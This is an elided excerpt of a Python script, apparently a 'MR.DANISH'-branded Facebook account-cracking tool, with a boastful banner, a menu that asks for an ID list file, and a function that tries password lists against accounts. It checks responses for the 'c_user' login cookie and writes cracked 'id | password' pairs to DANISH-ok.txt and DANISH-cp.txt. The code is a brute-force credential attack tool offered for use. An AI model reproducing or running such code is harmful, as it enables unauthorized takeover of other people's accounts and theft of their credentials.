...
\033[1;32m██████  ██   ██ ██   ████ ██ ███████ ██   ██ 
     ...
     👇  Q KA YA NAME NI BRAND HA😈♥️

         👉 MERY HATER FEEL KARO ❤️😘
...
def menu():
			...
			if riaz in ['1','01']:
				...
				print(' Example : /sdcard/DANISH.txt')
				...
				os.system('xdg-open https:/wa.me/+923463299102');menu()
...
def mmm(ids,names,passlist):
	...
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mMR.DANISH\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[DANISH-OK] '+ids+' | '+pas+'\033[1;32m')
				...
				if 'y' in pcp:
					...
					print('\33[1;31m[DANISH-CP] '+ids+' | '+pas+'\33[0;97m')
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				if 'y' in pcp:
					...
					print('\33[1;91m[DANISH-CP] '+ids+' | '+pas+'\33[0;97m')
	...
	try:
		...
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				print('\033[1;92m[DANISH-OK] '+cid+' | '+ps+'\033[1;32m')

				open('DANISH-ok.txt', 'a').write(cid+' | '+ps+'\n')
				...
				print('\33[1;31m[DANISH-CP] '+cid+' | '+ps+'\33[0;97m')

				open('DANISH-cp.txt', 'a').write(cid+' | '+ps+'\n')
